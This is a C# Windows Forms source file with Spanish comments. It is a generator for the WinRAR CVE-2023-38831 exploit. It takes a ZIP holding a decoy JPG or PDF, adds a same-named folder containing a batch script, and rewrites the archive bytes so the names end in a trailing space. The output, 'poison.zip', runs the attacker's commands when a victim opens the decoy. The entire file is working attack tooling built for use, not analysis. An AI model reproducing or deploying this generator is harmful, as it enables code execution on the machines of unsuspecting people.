using System.IO.Compression;
using System.Text;

namespace CVE_2023_38831_Exploit_Generator
{
    public partial class Form1 : Form
    {
        string pathFileZIP = string.Empty;
        string firstImageOrPdf = string.Empty;
        string selectedFileDestPath = string.Empty;

        public Form1()
        {
            InitializeComponent();
        }

        //Buscar archivo ZIP, guardar la ruta en pathFileRAR y mostrar la ruta en indicador.
        //Revisar el contenido del archivo ZIP y buscar imagenes JGP o PDF en raiz.
        //Seleccionar un elemento e indicar al usuario que archivo sera utilizado de señuelo.
        private void buttonSelectFolder_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Archivos ZIP (*.zip)|*.zip|Todos los archivos (*.*)|*.*";
            openFileDialog.Title = "Seleccionar archivo ZIP";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                pathFileZIP = openFileDialog.FileName;

                //Check if ZIP file is valid.
                if (checkZIPFile(pathFileZIP))
                {
                    textBoxFileOrigin.ForeColor = Color.Green;
                    MessageBox.Show("Archivo seleccionado: " + pathFileZIP, "Archivo Seleccionado + " + firstImageOrPdf, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    textBoxFileOrigin.Text = pathFileZIP;
                }
            }
        }

        bool checkZIPFile(string pathFileZIP)
        {
            textBoxFileOrigin.ForeColor = Color.Red;
            firstImageOrPdf = null;  // Inicializamos la variable firstImageOrPdf como nula.

            string fileName = Path.GetFileName(pathFileZIP);
            if (!File.Exists(pathFileZIP))
            {
                textBoxFileOrigin.Text = $"El archivo ZIP '{fileName}' no existe.";
                return false;
            }

            try
            {
                using (ZipArchive archivoZip = ZipFile.OpenRead(pathFileZIP))
                {
                    if (archivoZip.Entries.Count == 0)
                    {
                        textBoxFileOrigin.Text = $"El archivo ZIP '{fileName}' no contiene archivos.";
                        return false;
                    }

                    foreach (var entry in archivoZip.Entries)
                    {
                        string entryName = entry.FullName;
                        if (entryName.EndsWith(".pdf", StringComparison.OrdinalIgnoreCase) || entryName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase))
                        {
                            firstImageOrPdf = entryName;  // Almacenamos el nombre del primer archivo JPG o PDF encontrado.
                            return true;
                        }
                    }

                    textBoxFileOrigin.Text = $"El archivo ZIP '{fileName}' no contiene archivos PDF ni JPG en la raíz.";
                    return false;
                }
            }
            catch (InvalidDataException)
            {
                textBoxFileOrigin.Text = $"El archivo '{fileName}' no es un archivo ZIP válido.";
                return false;
            }
        }

        private void buttonGenerateExploit_Click(object sender, EventArgs e)
        {
            string SCRIPT_FILENAME = "generatedScriptFile.bat";
            string OUTPUT_FILENAME = "poison.zip";
            string TEMP_FOLDER = "decompressed";

            //string firstPayload = "";

            //File.WriteAllText(SCRIPT_NAME, textBoxCommands.Text + " & " + firstImageOrPdf);

            if (Directory.Exists(TEMP_FOLDER))
            {
                Directory.Delete(TEMP_FOLDER, true);
            }
            Directory.CreateDirectory(TEMP_FOLDER);

            if (File.Exists(pathFileZIP))
            {
                // Crea la carpeta de destino si no existe
                Directory.CreateDirectory(TEMP_FOLDER);

                // Descomprime el archivo ZIP en la carpeta de destino
                ZipFile.ExtractToDirectory(pathFileZIP, TEMP_FOLDER);

                Console.WriteLine("Archivo ZIP descomprimido correctamente.");
            }

            
            string tempDirectory = Path.Combine(TEMP_FOLDER, firstImageOrPdf + "A");
            if (!Directory.Exists(tempDirectory))
            {
                Directory.CreateDirectory(tempDirectory);
            }

            File.Copy(SCRIPT_FILENAME, Path.Combine(tempDirectory, firstImageOrPdf + "A.cmd"));
            File.Move(Path.Combine(TEMP_FOLDER, firstImageOrPdf), Path.Combine(TEMP_FOLDER, firstImageOrPdf + "B"));

            ZipFile.CreateFromDirectory(TEMP_FOLDER, TEMP_FOLDER + ".zip");

            byte[] content;

            using (FileStream fs = new FileStream(TEMP_FOLDER + ".zip", FileMode.Open, FileAccess.ReadWrite))
            {
                content = new byte[fs.Length];
                fs.Read(content, 0, content.Length);
            }

            string extension = Path.GetExtension(firstImageOrPdf);
            Console.WriteLine("La extensión del archivo es: " + extension);

            content = ReplaceBytes(content, Encoding.Default.GetBytes(extension + "A"), Encoding.Default.GetBytes(extension + " "));
            content = ReplaceBytes(content, Encoding.Default.GetBytes(extension + "B"), Encoding.Default.GetBytes(extension + " "));

            File.Delete(TEMP_FOLDER + ".zip");

            using (FileStream fs = new FileStream(OUTPUT_FILENAME, FileMode.Create, FileAccess.Write))
            {
                fs.Write(content, 0, content.Length);
            }
        }

        static byte[] ReplaceBytes(byte[] input, byte[] search, byte[] replacement)
        {
            MemoryStream ms = new MemoryStream();

            for (int i = 0; i < input.Length; i++)
            {
                bool match = true;

                for (int j = 0; j < search.Length; j++)
                {
                    if (i + j >= input.Length || input[i + j] != search[j])
                    {
                        match = false;
                        break;
                    }
                }

                if (match)
                {
                    ms.Write(replacement, 0, replacement.Length);
                    i += search.Length - 1;
                }
                else
                {
                    ms.WriteByte(input[i]);
                }
            }

            return ms.ToArray();
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }
    }
}